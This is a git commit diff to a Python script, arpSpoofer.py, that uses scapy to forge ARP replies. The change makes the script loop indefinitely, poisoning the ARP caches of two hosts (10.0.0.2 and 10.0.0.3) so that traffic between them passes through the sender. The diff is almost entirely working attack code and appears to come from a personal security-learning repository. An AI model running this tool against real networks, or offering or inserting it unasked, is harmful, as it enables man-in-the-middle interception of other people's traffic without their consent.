bcd173f36396f53020511830713248bf6fcca3e2
Tony Nguyen <69164218+Tnguye98@users.noreply.github.com>
2022-07-26 14:48:23 -0400

    Update arpSpoofer.py
    Created so that it will repeat itself.

--- Python/arpSpoofer.py
+++ Python/arpSpoofer.py
@@ -1,6 +1,7 @@
 #!/usr/env/bin python3
 
 import scapy.all as scapy
+import time
 
 def getMAC(ip):
 	arpRequest = scapy.ARP(pdst=ip)
@@ -14,5 +15,16 @@ def getMAC(ip):
 def spoof(targetIP, spoofIP):
 	targetMAC = getMAC(targetIP)
 	packet = scapy.ARP(op = 2, pdst = targetIP, hwdst = "", psrc = spoofIP)
-	scapy.send(packet)
+	scapy.send(packet, verbose = False)
 
+
+sentPacketsCount = 0
+try:
+	while True:
+		spoof("10.0.0.2", "10.0.0.3")
+		spoof("10.0.0.3", "10.0.0.2")
+		sentPacketsCount += 2
+		print("\r[+] Packets sent: " + str(sentPacketsCount), end = "")
+		time.sleep(2)
+except KeyboardInterrupt:
+	print("[+] Detected CTRL + C . . . . Quitting.")
